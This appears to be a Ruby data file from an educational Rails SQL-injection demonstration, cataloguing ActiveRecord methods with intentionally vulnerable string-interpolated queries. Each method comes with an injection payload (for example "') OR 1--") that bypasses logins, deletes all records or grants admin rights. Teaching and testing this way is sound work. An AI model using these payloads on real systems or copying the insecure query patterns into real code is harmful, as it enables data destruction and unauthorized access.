Queries = [
  {
    :action => :calculate,
    :name => "Calculate Methods",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Calculations.html#method-i-calculate",
    :query => "User.calculate(:count, payload[:column])",
    :input => {:name => :column, :example => "first_name) from users where is_admin=true;--"},
    :example => "This example allows you to finds the age of a specific user, rather than the sum of order amounts.",
    :sql => "SELECT COUNT(users.[REPLACE]) FROM users"
  },

  {
    :action => :delete_by,
    :name => "Delete By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-delete_by",
    :query => 'OrderProduct.delete_by("id = #{payload[:id]}")',
    :input => {:name => :id, :example => '1) OR 1=1--'},
    :example => "This example bypasses any conditions and deletes all users.",
    :sql => 'DELETE FROM "order_products" WHERE (id = [REPLACE])'
  },

  {
    :action => :destroy_by,
    :name => "Destroy By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-destroy_by",
    :query => 'User.destroy_by(["id = ? AND is_admin = #{payload[:is_admin]}", params[:id]])',
    :input => {:name => :is_admin, :example => "false) OR 1=1 --"},
    :example => "This example bypasses any conditions and deletes all users.",
    :sql => 'SELECT "users".* FROM "users" WHERE (id = NULL AND is_admin = [REPLACE])',
    :desc => <<-MD
Any methods which delete records should be used with lots of caution! `destroy_by` is only slightly safer
than `delete_by` since it will invoke callbacks associated with the model.
The `destroy_by` method takes the same kind of conditions arguments as `where`.
The argumene can be a string, an array, or a hash of conditions. Strings will not
be escaped at all. Use an array or hash to safely parameterize arguments.
Never pass user input directly to `destroy_by`.
    MD
  },

  {
    :action => :exists,
    :name => "Exists? Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/FinderMethods.html#method-i-exists-3F",
    :query => 'User.exists? ["last_name LIKE \'#{payload[:user]}%%\'"]',
    :input => {:name => :user, :example => "' OR is_admin=true and first_name LIKE 'A" },
    :example => "This is more obvious than the example above, but demonstrates checking another table for a given value.",
    :sql => "SELECT 1 AS one FROM users WHERE (last_name LIKE '[REPLACE]%') LIMIT $1  [[\"LIMIT\", 1]]",
  },

  {
    :action => :find_by,
    :name => "Find By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/FinderMethods.html#method-i-find_by",
    :query => 'User.find_by("first_name = \'#{payload[:first_name]}\' AND pw_hash = \'#{params[:password]}\'")',
    :input => {:name => :first_name, :example => "') OR 1=$1 --"},
    :example => 'This example would likely be found in a login-type flow and gives you an opportunity to either find a specific user by name, or return the first user in the database',
    :sql => "SELECT users.* FROM users WHERE (first_name = '[REPLACE]' AND pw_hash = '')"
  },

  {
    :action => :from_method,
    :name => "From Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-from",
    :query => "User.from(payload[:from]).where(admin: false).all",
    :input => {:name => :from, :example => "users WHERE admin = '1' OR ''=?;"},
    :example => "Instead of returning all non-admin users, we return all admin users.",
    :sql => "REPLACE",
    :desc => <<-MD
The `from` method accepts arbitrary SQL.
    MD
  },

  {
    :action => :group_method,
    :name => "Group Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-group",
    :query => "User.where(:admin => false).group(payload[:group])",
    :input => {:name => :group, :example => "name UNION SELECT * FROM users"},
    :example => "The intent of this query is to group non-admin users by the specified column. Instead, the query returns all users.",
    :sql => "REPLACE",
    :desc => "The `group` method accepts arbitrary SQL strings."
  },

  {
    :action => :having,
    :name => "Having Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-having",
    :query => 'Order.where(:user_id => 1).group(:user_id).having("total > #{payload[:total]}")',
    :input => {:name => :total, :example => "1) UNION SELECT * FROM orders--"},
    :example => "This input injects a union in order to return all orders, instead of just the orders from a single user.",
    :sql => "REPLACE",
    :desc => "The `having` method does not escape its input and is easy to use for SQL injection since it tends to be at the end of a query."
  },


  {
    :action => :joins,
    :name => "Joins Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-joins",
    :query => 'Order.joins(payload[:table]).where("total > 1000").all',
    :input => {:name => :table, :example => "--"},
    :example => 'Skip WHERE clause and return all orders instead of just the orders for the specified user.',
    :sql => "REPLACE",
    :desc => 'The `joins` method can take an array of associations or straight SQL strings.'
  },

  {
    :action => :lock,
    :name => "Lock Method and Option",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-lock",
    :query => "User.where('id > 1').lock(payload[:lock])",
    :input => {:name => :lock, :example => "?"},
    :example => "Not a real example: SQLite does not support this option.",
    :sql => "REPLACE",
    :desc => <<-MD
The `lock` method and the `:lock` option for `find` and related methods accepts a SQL fragment.
    MD
  },

  {
    :action => :not,
    :name => "Not Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods/WhereChain.html#method-i-not",
    :query => 'User.where.not("admin = 1 OR id IN (#{payload[:excluded]})").all',
    :input => {:name => :excluded, :example => "?)) OR 1=1 --"},
    :example => "Return all users, even if they are administrators.",
    :sql => "REPLACE",
    :desc => <<-MD
The `not` method is equivalent to `where` and is equally unsafe when passed SQL strings directly.
    MD
  },

  {
    :action => :select_method,
    :name => 'Select Method',
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-select",
    :query => 'User.select(payload[:column])',
    :input => {:name => :column, :example => "* FROM users WHERE admin = '1' ;"},
    :example => 'Since the `SELECT` clause is at the beginning of the query, nearly any SQL can be injected.',
    :sql => "REPLACE",
   :desc => 'The `:select` method allows complete control over the `SELECT` clause of the query.'
  },

  {
    :action => :reselect_method,
    :name => 'Reselect Method',
    :link => 'https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-reselect',
    :query => 'User.select(:name).reselect(payload[:column])',
    :input => {:name => :column, :example => "* FROM orders -- "},
    :example => 'This is the same as `select`. Since the `SELECT` clause is at the beginning of the query, nearly any SQL can be injected, including querying totally different tables than intended.',
    :sql => "REPLACE",
    :desc => 'The `reselect` method allows complete control over the `SELECT` clause of the query.'
  },

  {
    :action => :where,
    :name => "Where Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-where",
    :query => 'User.where("first_name = \'#{payload[:first_name]}\' AND password = \'#{params[:password]}\'")',
    :input => {:name => :first_name, :example => "') OR 1--"},
    :example => 'The example below is using classic SQL injection to bypass authentication.',
    :sql => "REPLACE",
    :desc => <<-MD
The `where` method can be passed a straight SQL string. Calls using a hash of name-value pairs are escaped, and the array form can be used for safely parameterizing queries.
     MD
  },

  {
    :action => :rewhere,
    :name => "Rewhere Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-rewhere",
    :query => 'User.where(name: "Bob").rewhere("age > #{payload[:age]}")',
    :input => {:name => :age, :example => '1=1) OR 1=1--'},
    :example => 'Find all users, regardless of name or age.',
    :sql => "REPLACE",
    :desc => <<-MD
  Like `where`, the `rewhere` method can be passed a straight SQL string. `rewhere` adds the new conditions as a conjunction using `AND`.
  Calls using a hash of name-value pairs are escaped, and the array form can be used for safely parameterizing queries.
   MD
  },

  {
    :action => :update_all_method,
    :name => "Update All Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-update_all",
    :query => 'User.update_all("admin = 1 WHERE name LIKE \'%#{payload[:name]}%\'")',
    :input => {:name => :name, :example => '\' OR 1=1;'},
    :example => "Update every user to be an admin.",
    :sql => "REPLACE",
    :desc => <<-MD
`update_all` accepts any SQL as a string.
User input should never be passed directly to `update_all`, only as values in a hash table.
    MD
  },
]